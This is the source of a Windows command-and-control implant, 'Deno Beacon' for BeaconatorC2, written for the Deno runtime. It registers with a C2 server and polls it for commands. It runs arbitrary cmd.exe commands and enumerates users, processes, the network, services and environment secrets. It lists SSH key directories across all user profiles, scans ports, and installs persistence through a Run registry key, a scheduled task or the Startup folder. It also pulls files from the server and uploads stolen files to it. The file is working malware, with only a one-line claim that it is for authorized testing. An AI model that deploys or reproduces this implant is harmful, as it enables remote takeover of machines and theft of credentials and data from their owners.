/**
 * Deno Beacon for BeaconatorC2 (Windows)
 * Stage 2/3 payload for the Deno one-liner beacon.
 *
 * Stage 1 (cmd one-liner) installs Deno and pulls this file from the C2
 * server via the to_beacon|deno_beacon.ts HTTP file-transfer command, then
 * runs it with: deno run -A deno_beacon.ts
 *
 * It can also be run directly for testing:
 *   deno run -A beacons/deno_beacon.ts
 *
 * Configuration is read from environment variables (set by stage 1):
 *   BC_SERVER   - C2 server IP/hostname (default 127.0.0.1)
 *   BC_PORT     - C2 HTTP receiver port  (default 8080)
 *   BC_ENDPOINT - HTTP endpoint path     (default /)
 *   BC_INTERVAL - check-in interval secs (default 15)
 *
 * Use only for authorized security testing. See LICENSE/README.md.
 */

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------
// CLI args (positional) take priority, then BC_* environment variables.
// The cmd one-liner passes: <server> <port> <endpoint> <interval>
const SERVER = Deno.args[0] ?? Deno.env.get("BC_SERVER") ?? "127.0.0.1";
const PORT = parseInt(Deno.args[1] ?? Deno.env.get("BC_PORT") ?? "8080", 10);
const ENDPOINT = Deno.args[2] ?? Deno.env.get("BC_ENDPOINT") ?? "/";
const INTERVAL = parseInt(Deno.args[3] ?? Deno.env.get("BC_INTERVAL") ?? "15", 10);

const BASE_URL = `http://${SERVER}:${PORT}${ENDPOINT}`;
const USER_AGENT = `DenoBeacon/1.0`;
const MAX_RESULTS = 100; // cap for FileSearch / SSH_Discovery listings
const PORT_TIMEOUT = 3000; // ms per port for PortScan
const decoder = new TextDecoder();
const encoder = new TextEncoder();

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Generate a stable-ish 8 hex char beacon ID from system info + pid. */
function generateBeaconId(): string {
  const seed = `${hostname()}|${username()}|${Date.now()}|${Deno.pid}`;
  // djb2 hash
  let h = 5381;
  for (let i = 0; i < seed.length; i++) {
    h = ((h << 5) + h + seed.charCodeAt(i)) >>> 0;
  }
  return h.toString(16).padStart(8, "0");
}

function hostname(): string {
  return Deno.env.get("COMPUTERNAME") ??
    (typeof Deno.hostname === "function" ? Deno.hostname() : "unknown-host");
}

function username(): string {
  return Deno.env.get("USERNAME") ??
    Deno.env.get("USERDOMAIN\\USERNAME") ?? "unknown-user";
}

/** POST a protocol message to the C2 and return the response body. */
async function post(body: string): Promise<string> {
  const res = await fetch(BASE_URL, {
    method: "POST",
    headers: {
      "User-Agent": USER_AGENT,
      "Content-Type": "text/plain; charset=utf-8",
    },
    body,
  });
  return await res.text();
}

/** Execute a shell command via cmd.exe, returning combined stdout/stderr. */
async function runCmd(command: string): Promise<string> {
  try {
    const cmd = new Deno.Command("cmd.exe", {
      args: ["/c", command],
      stdout: "piped",
      stderr: "piped",
      stdin: "null",
    });
    const { code, stdout, stderr } = await cmd.output();
    const out = decoder.decode(stdout);
    const err = decoder.decode(stderr);
    let result = "";
    if (out.length > 0) result += `STDOUT:\n${out}\n`;
    if (err.length > 0) result += `STDERR:\n${err}\n`;
    if (result.length === 0) result = `Command executed (exit code: ${code})\n`;
    return result;
  } catch (e) {
    return `ERROR executing command: ${e}\n`;
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function splitParams(params: string): string[] {
  return params.split(",").map((p) => p.trim());
}

// ---------------------------------------------------------------------------
// Modules (execute_module|{module}|{params})
// ---------------------------------------------------------------------------

async function moduleSystemInfo(): Promise<string> {
  let osRelease = "unknown";
  try {
    osRelease = (typeof Deno.osRelease === "function")
      ? Deno.osRelease()
      : (await runCmd("ver")).trim();
  } catch { /* keep unknown */ }

  let ppid = "n/a";
  try {
    ppid = String((Deno as { ppid?: number }).ppid ?? "n/a");
  } catch { /* keep n/a */ }

  let mem = "n/a";
  try {
    const mu = (Deno as { memoryUsage?: () => { rss: number } })
      .memoryUsage?.();
    if (mu) mem = `${Math.round(mu.rss / 1024 / 1024)} MB RSS`;
  } catch { /* keep n/a */ }

  return [
    "=== SYSTEM INFO ===",
    `Hostname: ${hostname()}`,
    `User: ${Deno.env.get("USERDOMAIN") ?? ""}\\${username()}`,
    `OS: ${Deno.build.os} (${osRelease})`,
    `Arch: ${Deno.build.arch}`,
    `Deno: ${Deno.version.deno} (V8 ${Deno.version.v8})`,
    `Memory: ${mem}`,
    `CWD: ${Deno.cwd()}`,
    `PID: ${Deno.pid} (PPID: ${ppid})`,
    `Script: ${Deno.mainModule.replace("file:///", "").replace(/\//g, "\\")}`,
  ].join("\n");
}

async function moduleProcessEnum(): Promise<string> {
  let out = "=== PROCESS ENUMERATION ===\n";
  const tasklist = await runCmd("tasklist /v /fo list");
  if (tasklist.includes("STDOUT")) {
    out += tasklist;
  } else {
    out += await runCmd("tasklist");
  }
  return out;
}

async function moduleNetworkEnum(): Promise<string> {
  let out = "=== NETWORK ENUMERATION ===\n";
  out += "Interfaces:\n";
  out += await runCmd("ipconfig /all");
  out += "\nActive Connections:\n";
  out += await runCmd("netstat -ano");
  out += "\nARP Table:\n";
  out += await runCmd("arp -a");
  return out;
}

async function moduleUserEnum(): Promise<string> {
  let out = "=== USER ENUMERATION ===\n";
  out += `Current User: ${Deno.env.get("USERDOMAIN") ?? ""}\\${username()}\n`;
  out += "Privileges (whoami /all):\n";
  out += await runCmd("whoami /all");
  out += "\nLocal Users:\n";
  out += await runCmd("net user");
  out += "\nLocal Groups:\n";
  out += await runCmd("net localgroup");
  return out;
}

async function moduleServiceEnum(): Promise<string> {
  let out = "=== SERVICE ENUMERATION ===\n";
  const sc = await runCmd("sc query state= all");
  if (sc.includes("STDOUT") && !sc.includes("STDERR")) {
    out += sc;
  } else {
    out += "Running services (net start):\n";
    out += await runCmd("net start");
  }
  return out;
}

async function moduleEnvironmentEnum(): Promise<string> {
  const env = Deno.env.toObject();
  const keys = Object.keys(env).sort();
  const lines = keys.map((k) => `${k}=${env[k]}`);
  return "=== ENVIRONMENT ENUMERATION ===\n" + lines.join("\n") + "\n";
}

async function moduleFileSearch(
  directory: string,
  pattern: string,
): Promise<string> {
  const dir = directory || Deno.cwd();
  const pat = (pattern || "txt").toLowerCase();
  const results: string[] = [];

  const walk = (d: string, depth: number): void => {
    if (results.length >= MAX_RESULTS || depth > 10) return;
    let entries;
    try {
      entries = [...Deno.readDirSync(d)];
    } catch {
      return; // permission denied or missing
    }
    for (const entry of entries) {
      if (results.length >= MAX_RESULTS) return;
      const full = `${d.replace(/[\\]+$/, "")}\\${entry.name}`;
      if (entry.isDirectory) {
        // skip noisy system trees
        if (
          entry.name === "$Recycle.Bin" || entry.name === "WinSxS" ||
          entry.name === "AppData"
        ) continue;
        walk(full, depth + 1);
      } else if (entry.name.toLowerCase().includes(pat)) {
        results.push(full);
      }
    }
  };

  walk(dir, 0);
  let out = `=== FILE SEARCH ===\nSearching for '${pat}' in '${dir}'\n`;
  if (results.length === 0) {
    out += "No results found.\n";
  } else {
    out += results.join("\n") + "\n";
    out += `(${results.length} results${results.length >= MAX_RESULTS ? ", truncated" : ""})\n`;
  }
  return out;
}

async function scanPort(host: string, port: number): Promise<boolean> {
  try {
    const conn = await Promise.race([
      Deno.connect({ hostname: host, port }),
      new Promise((_resolve, reject) =>
        setTimeout(() => reject(new Error("timeout")), PORT_TIMEOUT)
      ),
    ]) as Deno.Conn;
    conn.close();
    return true;
  } catch {
    return false;
  }
}

async function modulePortScan(target: string, ports: string): Promise<string> {
  const host = target || "127.0.0.1";
  const portList = (ports || "22,80,443,3389")
    .split(/[,\s]+/)
    .map((p) => parseInt(p, 10))
    .filter((p) => !isNaN(p) && p > 0 && p < 65536);

  let out = `=== PORT SCAN ===\nScanning ${host} for ports: ${portList.join(",")}\n`;
  for (const port of portList) {
    const open = await scanPort(host, port);
    out += `${port}: ${open ? "OPEN" : "CLOSED"}\n`;
  }
  return out;
}

async function moduleDnsEnum(domain: string): Promise<string> {
  const dom = domain || "example.com";
  let out = `=== DNS ENUMERATION ===\nDomain: ${dom}\n`;
  const types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT"] as const;
  for (const t of types) {
    try {
      const records = await Deno.resolveDns(dom, t);
      out += `${t}:\n`;
      out += records.map((r) => `  ${JSON.stringify(r)}`).join("\n") + "\n";
    } catch {
      out += `${t}: lookup failed\n`;
    }
  }
  return out;
}

async function moduleSshDiscovery(): Promise<string> {
  let out = "=== SSH KEY DISCOVERY ===\n";
  const found: string[] = [];

  const scanSshDir = (sshDir: string) => {
    let entries;
    try {
      entries = [...Deno.readDirSync(sshDir)];
    } catch {
      return false;
    }
    found.push(`SSH Directory found: ${sshDir}`);
    for (const entry of entries) {
      found.push(`  ${sshDir}\\${entry.name}`);
    }
    return true;
  };

  // Current user
  const home = Deno.env.get("USERPROFILE") ?? "";
  if (home && !scanSshDir(`${home}\\.ssh`)) {
    out += `No SSH directory found for current user (${home}\\.ssh)\n`;
  }

  // All user profiles
  let userDirs: string[] = [];
  try {
    userDirs = [...Deno.readDirSync("C:\\Users")]
      .filter((e) => e.isDirectory && !e.name.startsWith("Public"))
      .map((e) => `C:\\Users\\${e.name}\\.ssh`);
  } catch { /* no C:\Users */ }
  for (const d of userDirs) {
    scanSshDir(d);
    if (found.length > MAX_RESULTS) break;
  }

  if (found.length === 0) {
    out += "No SSH directories found on this system.\n";
  } else {
    out += found.slice(0, MAX_RESULTS).join("\n") + "\n";
  }
  return out;
}

async function modulePersistence(
  method: string,
  command: string,
): Promise<string> {
  const cmd = command || `powershell -NoP -W Hidden -Command "<your command>"`;
  let out = `=== PERSISTENCE ===\nMethod: ${method}\nCommand: ${cmd}\n`;

  switch (method) {
    case "registry": {
      const res = await runCmd(
        `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DenoBeacon /t REG_SZ /d "${cmd}" /f`,
      );
      out += res.includes("STDOUT") || res.includes("successfully")
        ? "Registry Run key added (HKCU)\\...\\Run\\DenoBeacon\n"
        : `Registry persistence failed:\n${res}`;
      break;
    }
    case "schtasks": {
      const res = await runCmd(
        `schtasks /create /tn DenoBeacon /sc onlogon /tr "${cmd}" /f`,
      );
      out += res.includes("STDOUT")
        ? "Scheduled task 'DenoBeacon' created (onlogon)\n"
        : `Scheduled task creation failed:\n${res}`;
      break;
    }
    case "startup": {
      const appdata = Deno.env.get("APPDATA") ?? "";
      if (!appdata) {
        out += "Could not resolve APPDATA for startup folder.\n";
        break;
      }
      const startupDir =
        `${appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`;
      const bat = `${startupDir}\\beacon_update.cmd`;
      try {
        await Deno.writeTextFile(bat, `@echo off\r\n${cmd}\r\n`);
        out += `Startup script written: ${bat}\n`;
      } catch (e) {
        out += `Startup folder persistence failed: ${e}\n`;
      }
      break;
    }
    default:
      out += `Unsupported persistence method: ${method}\n`;
  }
  return out;
}

/** Download a file from the C2 server's files/ directory (to_beacon). */
async function moduleDownloadFile(
  filename: string,
  destination?: string,
): Promise<string> {
  const name = filename.replace(/[\r\n]/g, "");
  if (!name) return "ERROR: no filename provided\n";

  const res = await fetch(BASE_URL, {
    method: "POST",
    headers: { "User-Agent": USER_AGENT },
    body: `to_beacon|${name}`,
  });

  if (!res.ok) {
    const errText = await res.text();
    await post(`download_failed|${ID}|${name}`);
    return `Download failed for '${name}' (HTTP ${res.status}): ${errText}\n`;
  }

  const bytes = new Uint8Array(await res.arrayBuffer());
  const target = destination || name.replace(/^.*[\\/]/, "");
  try {
    await Deno.writeFile(target, bytes);
  } catch (e) {
    await post(`download_failed|${ID}|${name}`);
    return `ERROR writing '${target}': ${e}\n`;
  }

  await post(`download_complete|${ID}|${name}`);
  return `Downloaded ${name} -> ${Deno.cwd()}\\${target} (${bytes.length} bytes)\n`;
}

/**
 * Upload a file to the C2 server's files/ directory (from_beacon).
 *
 * The HTTP receiver expects the file bytes streamed on the same connection
 * after the 'from_beacon|{name}' command body, with the client closing the
 * connection to signal end-of-data, so this speaks raw HTTP over a socket.
 */
async function moduleUploadFile(path: string): Promise<string> {
  const cleanPath = path.replace(/^"|"$/g, "").trim();
  if (!cleanPath) return "ERROR: no file path provided\n";

  let data: Uint8Array;
  try {
    data = await Deno.readFile(cleanPath);
  } catch (e) {
    return `ERROR reading '${cleanPath}': ${e}\n`;
  }

  const name = cleanPath.replace(/^.*[\\/]/, "");
  const command = `from_beacon|${name}`;
  const request =
    `POST ${ENDPOINT} HTTP/1.1\r\nHost: ${SERVER}:${PORT}\r\n` +
    `User-Agent: ${USER_AGENT}\r\nContent-Type: application/octet-stream\r\n` +
    `Connection: close\r\nContent-Length: ${command.length}\r\n\r\n${command}`;

  let responseSummary = "";
  try {
    const conn = await Deno.connect({ hostname: SERVER, port: PORT });
    try {
      await conn.write(encoder.encode(request));
      await conn.write(data);
      // Half-close so the server sees end-of-file, then read the response.
      try {
        (conn as unknown as { closeWrite?: () => void }).closeWrite?.();
      } catch { /* older Deno without closeWrite */ }
      const buf = new Uint8Array(2048);
      const n = await conn.read(buf);
      if (n) {
        responseSummary = decoder.decode(buf.subarray(0, n)).split("\r\n\r\n")[1] ??
          "";
      }
    } finally {
      try {
        conn.close();
      } catch { /* already closed */ }
    }
  } catch (e) {
    return `ERROR uploading '${cleanPath}': ${e}\n`;
  }

  return `Uploaded ${name} (${data.length} bytes). Server said: ${responseSummary.trim() || "(no response)"}\n`;
}

// ---------------------------------------------------------------------------
// Command dispatch
// ---------------------------------------------------------------------------

const ID = generateBeaconId();

async function handleCommand(commandData: string): Promise<string> {
  const cmd = commandData.trim();

  if (cmd === "shutdown" || cmd === "execute_module|Cleanup") {
    return "=== CLEANUP ===\nStopping beacon and cleaning up...\n";
  }

  if (cmd.startsWith("execute_command|")) {
    return await runCmd(cmd.slice("execute_command|".length));
  }

  if (cmd.startsWith("execute_module|")) {
    const rest = cmd.slice("execute_module|".length);
    const firstPipe = rest.indexOf("|");
    const module = firstPipe === -1 ? rest : rest.slice(0, firstPipe);
    const params = firstPipe === -1 ? "" : rest.slice(firstPipe + 1);

    switch (module) {
      case "SystemInfo":
        return await moduleSystemInfo();
      case "ProcessEnum":
        return await moduleProcessEnum();
      case "NetworkEnum":
        return await moduleNetworkEnum();
      case "UserEnum":
        return await moduleUserEnum();
      case "ServiceEnum":
        return await moduleServiceEnum();
      case "EnvironmentEnum":
        return await moduleEnvironmentEnum();
      case "FileSearch": {
        // First comma separates the directory from the pattern; the pattern
        // may itself contain commas.
        const sep = params.indexOf(",");
        const dir = sep === -1 ? params : params.slice(0, sep);
        const pattern = sep === -1 ? "" : params.slice(sep + 1);
        return await moduleFileSearch(dir, pattern);
      }
      case "PortScan": {
        // First comma separates the target from the comma-separated port list.
        const sep = params.indexOf(",");
        const target = sep === -1 ? params : params.slice(0, sep);
        const ports = sep === -1 ? "" : params.slice(sep + 1);
        return await modulePortScan(target, ports);
      }
      case "DNSEnum": {
        const [domain = ""] = splitParams(params);
        return await moduleDnsEnum(domain);
      }
      case "SSH_Discovery":
        return await moduleSshDiscovery();
      case "Persistence": {
        const [method = "registry", ...restParams] = splitParams(params);
        return await modulePersistence(method, restParams.join(","));
      }
      case "DownloadFile": {
        const [filename = "", destination = ""] = splitParams(params);
        return await moduleDownloadFile(filename, destination || undefined);
      }
      case "UploadFile":
        return await moduleUploadFile(params);
      default:
        return `ERROR: Unknown module '${module}'\n`;
    }
  }

  // Bare command (schema command_template: '{command}')
  return await runCmd(cmd);
}

// ---------------------------------------------------------------------------
// Main loop
// ---------------------------------------------------------------------------

async function main() {
  console.log(
    `[DenoBeacon] id=${ID} server=${BASE_URL} interval=${INTERVAL}s`,
  );

  // Register (4th field = schema file for auto-schema-select in the manager UI)
  try {
    const resp = await post(`register|${ID}|${hostname()}|deno_beacon.yaml`);
    console.log(`[DenoBeacon] registration: ${resp.trim()}`);
  } catch (e) {
    console.log(`[DenoBeacon] registration failed (will retry loop): ${e}`);
  }

  while (true) {
    let commandData = "";
    try {
      commandData = (await post(`request_action|${ID}`)).trim();
    } catch {
      commandData = ""; // server unreachable, retry after interval
    }

    if (
      commandData && commandData !== "no_pending_commands" &&
      !commandData.startsWith("ERROR")
    ) {
      let output = "";
      let shouldExit = false;
      try {
        output = await handleCommand(commandData);
        shouldExit = commandData.trim() === "shutdown" ||
          commandData.trim() === "execute_module|Cleanup";
      } catch (e) {
        output = `ERROR processing command: ${e}\n`;
      }
      try {
        await post(`command_output|${ID}|${output}`);
      } catch { /* ignore, retry next loop */ }
      if (shouldExit) {
        console.log("[DenoBeacon] shutdown requested, exiting.");
        Deno.exit(0);
      }
    }

    await sleep(INTERVAL * 1000);
  }
}

await main();
